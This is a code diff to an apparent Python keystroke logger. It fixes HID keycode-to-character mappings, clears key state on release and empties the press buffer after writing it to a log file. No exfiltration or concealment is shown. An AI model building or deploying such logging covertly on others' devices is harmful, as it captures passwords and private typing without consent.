@@ -9,7 +9,7 @@ key_map = {
     30: "1", 31: "2", 32: "3", 33: "4", 34: "5",
     35: "6", 36: "7", 37: "8", 38: "9", 39: "0",
     # Controls
-    40: "[ENTER]",
+    40: "[ENTER]\n",
     41: "[ESC]",
     42: "[BKSP]",
     43: "[TAB]",
@@ -69,7 +69,7 @@ key_map_shift = {
     30: "!", 31: "@", 32: "#", 33: "$", 34: "%",
     35: "^", 36: "&", 37: "*", 38: "(", 39: ")",
     # Controls (same as normal)
-    40: "[ENTER]",
+    40: "[ENTER]\n",
     41: "[ESC]",
     42: "[BKSP]",
     43: "[TAB]",
@@ -150,7 +150,11 @@ class Log:
         self.lock = key_lock
     
     def _get_press(self, modifiers, keys):
+        if not modifiers and not keys:
+            self.last_state.clear()
+            return ""
         if not keys:
+            self.last_state.clear()
             return ""
         mod = ModKeys(modifiers)
         newly_pressed_keys = set(keys) - self.last_state
@@ -192,13 +196,14 @@ class Log:
         string = "".join(self.buffer)
         file = open(self.path, "a")
         file.write(string)
+        self.buffer.clear()
         file.close()
 
     def add(self, modifiers, keys):
         # Flush when buffer reaches size limit
         if len(self.buffer) >= self.size:
             self._flush()
-        # Then write to file
+        # Then add to buffer
         press_str = self._get_press(modifiers, keys)
         if press_str:
             self.buffer.append(press_str)
